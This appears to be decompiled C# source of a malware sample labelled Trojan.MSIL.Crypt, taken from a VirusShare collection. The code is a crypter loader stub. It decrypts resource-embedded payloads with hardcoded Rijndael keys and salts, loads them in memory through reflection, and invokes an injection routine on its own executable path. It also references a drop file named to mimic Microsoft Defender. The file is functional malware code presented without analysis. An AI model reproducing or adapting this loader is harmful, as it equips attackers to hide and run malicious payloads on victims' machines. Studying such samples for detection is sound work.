// Decompiled with JetBrains decompiler
// Type: xZhtWpVtLXLJDVSoYj
// Assembly: BTCrypt, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 05F7BF95-3B6B-4870-9E92-274D6E31A439
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00004-msil\Trojan.MSIL.Crypt.bkc-5f5560792d58a85ded3a28624027cea39aef9092ad62a5dffd1dafc5b77fbede.exe

using Microsoft.VisualBasic.CompilerServices;
using My;
using System;
using System.IO;
using System.Reflection;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Text;

[StandardModule]
internal sealed class xZhtWpVtLXLJDVSoYj
{
  private static int ByteCount = 0;

  [STAThread]
  public static void Main()
  {
    xZhtWpVtLXLJDVSoYj.ftyu();
    ProjectData.EndApp();
  }

  public static void ftyu() => xZhtWpVtLXLJDVSoYj.pol();

  public static void pol()
  {
    string location = Assembly.GetExecutingAssembly().Location;
    string str = MyProject.Computer.FileSystem.SpecialDirectories.CurrentUserApplicationData + "\\MpUS.exe";
    ResourceManager resourceManager = new ResourceManager("mdqBj", Assembly.GetExecutingAssembly());
    string name = resourceManager.GetString("cLLyk");
    string zfnomrdWdIUTjnqhHW = "TuDQrMqPgHhsmFn";
    string bzGCNQfBCMVQtJcwPK = resourceManager.GetString("LuFLHSjyGIRojNPv");
    byte[] bytes1 = Encoding.Default.GetBytes(xZhtWpVtLXLJDVSoYj.bOBbxLZGYKOnbZTliF(resourceManager.GetString("CVdSxttswi"), "QBRVYPoR"));
    Encoding.Default.GetBytes(xZhtWpVtLXLJDVSoYj.bOBbxLZGYKOnbZTliF(resourceManager.GetString("RxbqX"), "ewFu"));
    byte[] bytes2 = Encoding.Default.GetBytes(xZhtWpVtLXLJDVSoYj.bOBbxLZGYKOnbZTliF(bzGCNQfBCMVQtJcwPK, zfnomrdWdIUTjnqhHW));
    RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(Assembly.Load(bytes1).GetType(name).GetMethod(resourceManager.GetString("MJDV")).Invoke((object) null, new object[6]
    {
      (object) bytes2,
      (object) true,
      (object) location,
      (object) true,
      (object) false,
      (object) false
    })));
  }

  public static string bOBbxLZGYKOnbZTliF(string bzGCNQfBCMVQtJcwPK, string zfnomrdWdIUTjnqhHW)
  {
    string s1 = "jhsethsdutubgt";
    string s2 = "a48uyrhf094hy2dm";
    int iterations = 2;
    string strHashName = "SHA1";
    int num = 256;
    try
    {
      byte[] bytes1 = Encoding.Default.GetBytes(bzGCNQfBCMVQtJcwPK);
      byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
      byte[] bytes3 = Encoding.ASCII.GetBytes(s1);
      byte[] buffer = bytes1;
      byte[] bytes4 = new PasswordDeriveBytes(zfnomrdWdIUTjnqhHW, bytes3, strHashName, iterations).GetBytes(checked ((int) Math.Round(unchecked ((double) num / 8.0))));
      RijndaelManaged rijndaelManaged = new RijndaelManaged();
      rijndaelManaged.Mode = CipherMode.CBC;
      byte[] numArray = new byte[checked (buffer.Length + 1)];
      using (ICryptoTransform decryptor = rijndaelManaged.CreateDecryptor(bytes4, bytes2))
      {
        using (MemoryStream memoryStream = new MemoryStream(buffer))
        {
          using (CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, decryptor, CryptoStreamMode.Read))
          {
            xZhtWpVtLXLJDVSoYj.ByteCount = cryptoStream.Read(numArray, 0, numArray.Length);
            memoryStream.Close();
            cryptoStream.Close();
          }
        }
      }
      rijndaelManaged.Clear();
      return Encoding.Default.GetString(numArray);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      throw;
    }
  }
}
